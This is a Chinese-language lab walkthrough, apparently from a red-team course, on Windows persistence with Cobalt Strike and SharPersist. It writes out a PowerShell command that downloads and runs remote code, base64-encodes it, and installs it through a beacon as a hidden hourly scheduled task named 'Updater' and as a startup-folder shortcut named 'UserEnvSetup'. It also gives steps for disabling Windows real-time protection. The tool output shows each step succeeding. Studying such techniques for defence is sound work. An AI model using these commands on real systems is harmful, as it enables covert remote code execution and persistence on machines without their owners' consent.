# 定时任务

1. 把执行的payload转成base64

windows：
```
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.1.5:80/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==
```
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658552371913.jpg)

kali:
```
┌──(root㉿kali)-[~]
└─# str='IEX ((new-object net.webclient).downloadstring("http://192.168.1.5:80/a"))'
                                                                                                                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==                                                                          
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658552409755.png)


2. 创建定时任务

使用工具[SharPersist.exe](https://github.com/mandiant/SharPersist/releases)

教材上这个实验用到的工具放在：```C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe```

我本地复现这个实验，工具放在kali的```/root/CobaltStrike/tools/```路径


```
beacon> execute-assembly tools/SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
[*] Tasked beacon to run .NET program: SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
[+] host called home, sent: 342717 bytes
[+] received output:

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly


[+] SUCCESS: Scheduled task added

```

参数
```
-t是所需的持久性技术。
-c是要执行的命令。
-a是该命令的任何参数。
-n是任务的名称。
-m是添加任务（也可以remove，check和list）。
-o是任务频率。
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658552739085.png)


在win上,打开```Task Scheduler ```，找到定时任务```Updater```，点击run可以马上执行这个任务

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553107506.png)

收到beacon
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553273601.png)


# 启动文件夹

**注意，复现开机启动的权限维持，需要关闭靶机上的实时防护，否则不会返回beacon**

win+r打开注册表，输入```gpedit.msc```,按图操作，彻底关闭实时防护

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658555294635.png)

创建一个开机启动任务
```
beacon> execute-assembly tools/SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
[*] Tasked beacon to run .NET program: SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
[+] host called home, sent: 342719 bytes
[+] received output:

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==
[*] INFO: File Name: UserEnvSetup


[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: 4EF72582549967B29F66CF83BFA65F3D36EBFA8D2E0F3AB5CFE9ADFF51DC8011

```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553789330.png)

此时在```C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup```路径下会生成一个文件

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553996815.png)

重启windows主机，拿到baecon

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658554807580.png)